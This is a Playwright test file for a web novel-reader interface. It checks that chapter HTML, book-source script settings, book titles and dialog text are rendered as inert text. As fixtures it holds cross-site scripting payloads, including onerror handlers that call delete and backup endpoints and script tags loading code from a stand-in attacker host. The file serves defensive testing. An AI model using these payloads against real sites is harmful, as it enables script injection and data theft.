import { expect, test } from '@playwright/test'

test.beforeEach(async ({page}) => {
  await page.route('https://attacker.invalid/**', route => route.fulfill({contentType: 'text/javascript', body: 'window.pwned=1'}))
  await page.route('**/deleteBook', route => route.fulfill({json: {isSuccess: true}}))
  await page.route('**/cover?**', route => route.fulfill({status: 204}))
})

test('real chapter component renders formatting and images without active HTML', async ({ page }) => {
  const forbidden: string[] = []
  page.on('request', r => { if (/\/getBackupZip|\/deleteBook|attacker\.invalid/.test(r.url()) && !r.url().includes('/image?')) forbidden.push(r.url()) })
  await page.route('**/getBackupZip', route => route.fulfill({json: {}}))
  await page.route('**/image?**', route => route.fulfill({contentType: 'image/png', body: Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+jRZkAAAAASUVORK5CYII=', 'base64')}))
  await page.goto('/tests/fixture.html')
  await page.waitForFunction(() => (window as any).ready)
  await page.evaluate(() => (window as any).mountContent(`
    <b>正常粗体</b><ruby>字<rt>zi</rt></ruby>
    <img src="/getBackupZip" onerror="window.pwned=1;fetch('/deleteBook')">
    <svg onload="window.pwned=1"></svg><script>window.pwned=1</script>
    <iframe srcdoc="<script>parent.pwned=1</script>"></iframe>
    <form action="/deleteBook"><input name="url"></form>
    <a href="javascript:window.pwned=1">正文</a>
    <img src="data:image/svg+xml,<svg onload='parent.pwned=1'/>">
    <span style="background:url(https://attacker.invalid)" onclick="window.pwned=1">安全文字</span>`))
  await expect(page.locator('#fixture b')).toHaveText('正常粗体')
  await expect(page.locator('#fixture ruby rt')).toHaveText('zi')
  await expect(page.locator('#fixture script, #fixture svg, #fixture iframe, #fixture form, #fixture [onclick], #fixture [onerror], #fixture [style*="attacker"]')).toHaveCount(0)
  await expect(page.locator('#fixture img')).toHaveCount(1)
  expect(await page.locator('#fixture img').getAttribute('src')).toContain('/image?path=%2FgetBackupZip')
  expect(await page.evaluate(() => (window as any).pwned)).toBeUndefined()
  expect(forbidden).toEqual([])
})

for (const jsLib of [
  "window.pwned=1; fetch('/getBackupZip')",
  '<script>window.pwned=1</script><script src="https://attacker.invalid/payload.js"></script>',
  'https://attacker.invalid/payload.js',
]) test(`reader never executes source jsLib: ${jsLib.slice(0, 22)}`, async ({ page }) => {
  const forbidden: string[] = []
  page.on('request', r => { if (/getBackupZip|attacker\.invalid/.test(r.url())) forbidden.push(r.url()) })
  await page.route('**/get*', route => {
    const path = new URL(route.request().url()).pathname
    const data = path === '/getBookSource' ? {bookSourceUrl: 'source', bookSourceType: 0, jsLib}
      : path === '/getReadConfig' ? '{}'
      : path === '/getChapterList' ? [{index: 0, title: '第一章', url: 'chapter', bookUrl: 'book'}]
      : path === '/getBookContent' ? '普通正文' : []
    return route.fulfill({json: {isSuccess: true, errorMsg: '', data}})
  })
  await page.goto('/tests/fixture.html')
  await page.waitForFunction(() => (window as any).ready)
  const sourceRead = page.waitForResponse(r => r.url().includes('/getBookSource?'))
  await page.evaluate(() => {
    for (const [k, v] of Object.entries({bookUrl: 'book', bookName: '测试书', bookAuthor: '', bookOrigin: 'source'})) sessionStorage.setItem(k, v)
    ;(window as any).mountReader()
  })
  await sourceRead
  await expect(page.locator('#fixture')).toContainText('普通正文')
  expect(await page.evaluate(() => (window as any).pwned)).toBeUndefined()
  await expect(page.locator('[data-legado-jslib]')).toHaveCount(0)
  expect(forbidden).toEqual([])
})


test('failed automatic save then temporary reading exits through a text-only confirmation', async ({page}) => {
  const payload = '<img src="/missing" onerror="window.pwned=1">'
  let saveAttempts = 0
  await page.route('**/saveBook', route => {
    saveAttempts++
    return route.fulfill({json: {isSuccess: false, errorMsg: 'test save failure'}})
  })
  await page.route('**/get*', route => {
    const path = new URL(route.request().url()).pathname
    const data = path === '/getBookSource' ? {bookSourceUrl: 'source', bookSourceType: 0}
      : path === '/getReadConfig' ? '{}'
      : path === '/getChapterList' ? [{index: 0, title: '第一章', url: 'chapter', bookUrl: 'book'}]
      : path === '/getBookContent' ? '普通正文' : []
    return route.fulfill({json: {isSuccess: true, data}})
  })
  await page.goto('/tests/fixture.html')
  await page.waitForFunction(() => (window as any).ready)
  await page.evaluate(name => (window as any).mountBookInfo(name), payload)
  await expect(page.locator('.book-name')).toHaveText(payload)
  await page.locator('.read-btn').click()
  await expect(page.locator('#fixture')).toContainText('普通正文')
  expect(saveAttempts).toBe(1)
  expect(await page.evaluate(() => sessionStorage.getItem('isSeachBook'))).toBe('true')
  await page.evaluate(() => (window as any).leaveReader())
  await expect(page.locator('.web-confirm-body')).toHaveText(`是否将《${payload}》放入书架？`)
  await expect(page.locator('.web-confirm-box img')).toHaveCount(0)
  expect(await page.evaluate(() => (window as any).pwned)).toBeUndefined()
  await page.locator('.web-btn--cancel').click()
  await expect(page.locator('.web-confirm-overlay')).toHaveCount(0)
})

for (const kind of ['confirm', 'prompt']) test(`${kind} treats every supplied string as text`, async ({page}) => {
  await page.goto('/tests/fixture.html')
  await page.waitForFunction(() => (window as any).ready)
  const payload = '<img src="/missing" onerror="window.pwned=1">'
  await page.evaluate(({kind, payload}) => {
    ;(window as any).msgbox[kind](payload, payload, {
      confirmButtonText: payload, cancelButtonText: payload,
      inputPlaceholder: payload, inputErrorMessage: payload, inputValidator: () => false,
    }).catch(() => {})
  }, {kind, payload})
  await expect(page.locator('.web-confirm-header')).toContainText(payload)
  await expect(page.locator('.web-confirm-body')).toHaveText(payload)
  await expect(page.locator('.web-btn--primary')).toHaveText(payload)
  await expect(page.locator('.web-btn--cancel')).toHaveText(payload)
  await expect(page.locator('.web-confirm-box img')).toHaveCount(0)
  if (kind === 'prompt') {
    await expect(page.locator('input')).toHaveAttribute('placeholder', payload)
    await page.locator('.web-btn--primary').click()
    await expect(page.locator('.web-prompt-error')).toHaveText(payload)
  }
  expect(await page.evaluate(() => (window as any).pwned)).toBeUndefined()
  await page.locator('.web-btn--cancel').click()
  await expect(page.locator('.web-confirm-overlay')).toHaveCount(0)
})
